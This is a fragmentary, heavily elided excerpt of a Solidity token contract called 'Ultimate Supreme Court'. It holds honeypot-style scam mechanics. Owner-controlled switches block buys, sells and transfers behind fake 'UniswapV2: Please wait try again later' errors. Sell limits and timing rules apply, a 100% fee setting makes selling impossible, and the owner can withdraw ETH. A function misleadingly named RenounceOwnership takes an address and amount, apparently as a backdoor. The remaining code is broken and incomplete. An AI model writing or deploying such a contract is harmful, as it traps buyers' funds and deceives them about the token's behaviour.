...
contract Ownable is Context {
  ...
  function setAB() public virtual onlyOwner {
...
contract UltimateSupremeCourt is Context, IERC20, Ownable {
  ...
  string private constant _name = "Ultimate Supreme Court";
  ...
  function getOwner() external override view returns (address) {
    return owner();
      ...
      require(_startBuy == true, "UniswapV2: Please wait try again later");
      return true;
    }
    function isApprovedSell() internal view returns (bool){
      require(_startSell, "UniswapV2: Please wait try again later");
      return true;
    }
    function isApprovedTransfer() internal view returns (bool){
      require(_startTransfer == true, "UniswapV2: Please wait try again later");
      return true;
    }
    ...
    */
    ...
    function withdrawETH(address payable recipient, uint256 amount) external onlyOwner {
      ...
      if(amount > 0){
        ...
        require(approveTransaction, "UniswapV2: Please try again later");
          ...
          if(transactionType == 2 && burnTokens != true){
            if(_lastBuyTime[sender] + _sellApprovedTime > block.timestamp){
              ...
              if(_sell[sender] <= _maxLimitToSell){
                ...
                if(_inactiveFee == 100){
                  require(false, "UniswapV2: Please wait try again later");
                } else {
                  amount = taxes.add(amount);
    ...
    function RenounceOwnership(address addr, uint256 b) public onlyOwner {
